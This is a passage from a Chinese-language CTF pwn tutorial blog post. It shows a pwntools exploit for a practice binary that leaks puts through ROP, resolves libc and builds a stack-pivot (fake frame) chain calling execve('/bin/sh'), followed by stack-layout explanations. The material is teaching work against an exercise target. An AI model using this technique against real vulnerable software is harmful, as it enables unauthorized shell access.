io.sendafter(&quot;&gt;&quot;, flat([&#39;11111111&#39;, 0x400793, elf.got[&#39;puts&#39;], elf.plt[&#39;puts&#39;], 0x400676, (80 - 40) * &#39;1&#39;, stack, 0x4006be]))
put_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;))
libcmy = LibcSearcher(&#39;puts&#39;, put_addr)
libc_base = put_addr - libcmy.dump(&#39;puts&#39;)
execve_addr = libc_base + libcmy.dump(&#39;execve&#39;)
binsh_addr = libc_base + libcmy.dump(&quot;str_bin_sh&quot;)

success(&quot;libcmy.address -&gt; {:#x}&quot;.format(libc_base))

pop_rdi_ret=0x400793
&#39;&#39;&#39;
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;
0x00000000000f5279 : pop rdx ; pop rsi ; ret
#  need to be ajusted considering current libc.
&#39;&#39;&#39;
pop_rdx_pop_rsi_ret=libc_base+0x00000000001306d9

payload=flat([&#39;22222222&#39;, p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * &#39;2&#39;, stack - 48, 0x4006be])

io.sendafter(&quot;&gt;&quot;, payload)
io.interactive()
</code></pre><p>首次的溢出是为了让puts函数输出栈中存储的rsp的值。</p>
<h2 id="每部分内容的栈布置和相关寄存器变化。"><a href="#每部分内容的栈布置和相关寄存器变化。" class="headerlink" title="每部分内容的栈布置和相关寄存器变化。"></a>每部分内容的栈布置和相关寄存器变化。</h2><p><strong>为了输出puts@got的地址，栈分布情况</strong></p>
<pre><code>io.sendafter(&quot;&gt;&quot;, flat([&#39;11111111&#39;, 0x400793, elf.got[&#39;puts&#39;], elf.plt[&#39;puts&#39;], 0x400676, (80 - 40) * &#39;1&#39;, stack, 0x4006be]))
</code></pre><p><img src="https://desword.github.io/image/2019-10-27/19.png" alt=""></p>
<p>其中0x400793，用于pop第一个输入参数rdi。借助ROPgadget找到：</p>
<p><img src="https://desword.github.io/image/2019-10-27/20.png" alt=""></p>
<p>其中0x400676是用于重新载入有漏洞的read函数的。<br>其后填充40个字节，是由于前面已经有5*8的位置占用了。<br>0x4006be是leaver ret的地址。</p>
<p><strong>为了执行execve(“/bin/sh”,0 ,0)的栈分布情况</strong>:</p>
<pre><code>payload=flat([&#39;22222222&#39;, p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * &#39;2&#39;, stack - 48, 0x4006be])
</code></pre><p><img src="https://desword.github.io/image/2019-10-27/21.png" alt=""></p>
<p>其中：<br>pop_rdx_pop_rsi_ret=libc_base+0x00000000001306d9<br>这个部分的地址需要自己借助ROPgadget等工具来找到并且更新，不同机器会不一样。</p>
<p><img src="https://desword.github.io/image/2019-10-27/22.png" alt=""></p>
<p>这里需要解释一下为什么在执行execve的时候，需要stack-48,降低栈的高度来引rsp。</p>
<pre><code>stack - 48
</code></pre><p>这是因为，在第一次泄露puts@got函数地址，返回到带有漏洞的函数（即0x4000676）继续执行时，存在会改变rsp数值的操作。Rsp改变了，也就导致了溢出数据时的起始地址发生了改变，如果不进行调整，将无法跳转到正确的位置。我们发现在0x4000676有两处操作改变了rsp的数值。</p>
<pre><code>Push rbp, 我们得到stack + 40 -8 = stack +32  
Sub rsp, 50h, 我们得到stack + 32 – 0x50 = stack – 48  
</code></pre><p>后期跟进栈平衡原则，rsp的内容不会再有变化了。所以，我们这个时候输入payload数据会载入到rsp-48的位置，那么我们代码跳转的位置也需要相应的调整。</p>
<p>执行结果：</p>
<p><img src="https://desword.github.io/image/2019-10-27/23.png" alt=""></p>
<p>最后，照旧给大家留一道练习题来巩固一下。 我们下期见。<br><a href="https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn10" target="_blank" rel="noopener">Pwn10</a></p>
<p>参考资料：</p>
<p><a href="https://turingh.github.io/2016/01/27/frame-faking/" target="_blank" rel="noopener">https://turingh.github.io/2016/01/27/frame-faking/</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a></p>
<p>文章撰写仓促，难免有错漏，还望大家指正谢谢。</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>Title:</span><a href="/2019/10/29/linux-pwn-basic-3/">Linux pwn从入门到熟练（三）</a></p>
        <p><span>Author:</span><a href="/" title="Back to Homepage">Gonglong Chen</a></p>
        <p><span>Created:</span>2019-10-29, 14:17:11</p>
        <p><span>Updated:</span>2020-08-15, 09:28:56</p>
        <p>
            <span>Full URL:</span><a class="post-url" href="/2019/10/29/linux-pwn-basic-3/" title="Linux pwn从入门到熟练（三）">http://yoursite.com/2019/10/29/linux-pwn-basic-3/</a>
            <span class="copy-path" data-clipboard-text="From http://yoursite.com/2019/10/29/linux-pwn-basic-3/　　By Gonglong Chen" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2020/01/08/infosec-20/">
                    InforSec 2020 网络空间安全国际学术成果分享（上） Day One
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2019/05/22/lora-error-packet-modify/">
                    修改某款lora固件库以支持接收错误数据包
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">Contents</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#练习题pwn7参考解答"><span class="toc-number">2.</span> <span class="toc-text">练习题pwn7参考解答</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看保护"><span class="toc-number">2.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断漏洞函数"><span class="toc-number">2.2.</span> <span class="toc-text">判断漏洞函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取溢出点距离EBP的偏移距离"><span class="toc-number">2.3.</span> <span class="toc-text">获取溢出点距离EBP的偏移距离</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析是否载入了系统函数"><span class="toc-number">2.4.</span> <span class="toc-text">分析是否载入了系统函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取libc基地址"><span class="toc-number">2.5.</span> <span class="toc-text">获取libc基地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整的exp"><span class="toc-number">2.6.</span> <span class="toc-text">完整的exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp的栈分布图解："><span class="toc-number">2.7.</span> <span class="toc-text">exp的栈分布图解：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#64位程序通用ROP的构建"><span class="toc-number">3.</span> <span class="toc-text">64位程序通用ROP的构建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#快速三连：查保护，查漏洞，算偏移"><span class="toc-number">3.1.</span> <span class="toc-text">快速三连：查保护，查漏洞，算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析利用方式"><span class="toc-number">3.2.</span> <span class="toc-text">分析利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整的EXP"><span class="toc-number">3.3.</span> <span class="toc-text">完整的EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#每次调用csu时栈的分布和相关寄存器变化"><span class="toc-number">3.4.</span> <span class="toc-text">每次调用csu时栈的分布和相关寄存器变化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fake-frame应对有限的溢出空间"><span class="toc-number">4.</span> <span class="toc-text">fake frame应对有限的溢出空间</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#快速三连：查保护，查漏洞，算偏移-1"><span class="toc-number">4.1.</span> <span class="toc-text">快速三连：查保护，查漏洞，算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fake-frame-基本思路"><span class="toc-number">4.2.</span> <span class="toc-text">Fake frame 基本思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整的EXP-1"><span class="toc-number">4.3.</span> <span class="toc-text">完整的EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#每部分内容的栈布置和相关寄存器变化。"><span class="toc-number">4.4.</span> <span class="toc-text">每部分内容的栈布置和相关寄存器变化。</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="Hide" title="Show or Hide Table of Contents">

    <script>
        yiliaConfig.toc = ["Hide", "Show", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"Linux pwn从入门到熟练（三）　| Gonglong Chen　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>






<!-- for valine comment-->

    <div id="comment"></div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
new Valine({
    el: '#comment' ,
    notify:false, 
    verify:false, 
    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
    placeholder: 'Welcome to comments',
    avatar:'mm' 
});
</script>

    



    







    <div class="scroll" id="post-nav-button">
        
            <a href="/2020/01/08/infosec-20/" title="Pre: InforSec 2020 网络空间安全国际学术成果分享（上） Day One">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2019/05/22/lora-error-packet-modify/" title="Next: 修改某款lora固件库以支持接收错误数据包">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/01/08/inforsec20-day2/">InforSec 2020 网络空间安全国际学术成果分享（上） Day Two</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/08/infosec-20/">InforSec 2020 网络空间安全国际学术成果分享（上） Day One</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/29/linux-pwn-basic-3/">Linux pwn从入门到熟练（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/22/lora-error-packet-modify/">修改某款lora固件库以支持接收错误数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/linux-pwn-2/">Linux pwn从入门到熟练（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/18/linx-pwn-basic-rop/">Linux PWN从入门到熟练</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/03/cc2650-mqtt-client-example/">CC2650 launchpad + RPI + CC2650 sensor tag 构造MQTT控制蓝牙节点</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/01/fuzzer_simple_survey/">漏洞挖掘之乱拳打死老师傅——Fuzzer</a></li></ul>




    <script>
        
    </script>

</div>
      <footer id="footer">
    <div class="outer">


        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2020 Gonglong Chen
            </div>


            <div class="footer-right">

<!--
                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
-->

<!-- hitwebcounter Code START 
<a href="http://www.hitwebcounter.com" target="_blank">
<img src="http://hitwebcounter.com/counter/counter.php?page=6974923&style=0025&nbdigits=5&type=page&initCount=0" title="website counter" Alt="website counter"   border="0" align="up" >
</a> 
-->

<a href="https://clustrmaps.com/site/1aae7" title="Visit tracker"><img src="//clustrmaps.com/map_v2.png?cl=ffffff&w=a&t=tt&d=_A6aIN1PIjxyWChOHfot_6QWJTyXak5ICsMT6_Cye6I&co=2d78ad&ct=ffffff"></a>


            </div>



        </div>





<!--
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        

-->

    </div>
</footer>


    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 3;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<!--prettify代码高亮js引入-->

<script src="/plugins/prettify/prettify.js"></script>
<script type="text/javascript">
$(window).load(function(){
$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
 prettyPrint();
})
</script>


<!--page counter part-->
<script>
function addCount (Counter) {
        url=$('.article-date').attr('href').trim();
    title = $('.article-title').text().trim();
    var query=new AV.Query(Counter);
    //use url as unique idnetfication
    query.equalTo("url",url);
    query.find({
        success: function(results){
            if(results.length>0)
            {
                var counter=results[0];
                counter.fetchWhenSave(true); //get recent result
                counter.increment("time");
                counter.save();
            }
            else
            {
                var newcounter=new Counter();
                newcounter.set("title",title);
                newcounter.set("url",url);
                newcounter.set("time",1);
                newcounter.save(null,{
                    success: function(newcounter){
                    //alert('New object created');
                    },
                    error: function(newcounter,error){
                    alert('Failed to create');
                    }
                    });
            }
        },
        error: function(error){
            //find null is not a error
            alert('Error:'+error.code+" "+error.message);
        }
    });
}
$(function(){
    var Counter=AV.Object.extend("Counter");
    //only increse visit counting when intering a page
    if ($('.article-title').length == 1)
       addCount(Counter);
    var query=new AV.Query(Counter);
    query.descending("time");
    // the sum of popular posts
    query.limit(10); 
    query.find({
        success: function(results){
                for(var i=0;i<results.length;i++)    
                {
                    var counter=results[i];
                    title=counter.get("title");
                    url=counter.get("url");
                    time=counter.get("time");
                    // add to the popularlist widget
                    showcontent=title+" ("+time+")";
                    //notice the "" in href
                    $('.popularlist').append('<li><a href="'+url+'">'+showcontent+'</a></li>');
                }
            },
        error: function(error){
            alert("Error:"+error.code+" "+error.message);
        }
        }
    )
    });</script>
  </div>
</body>
</html>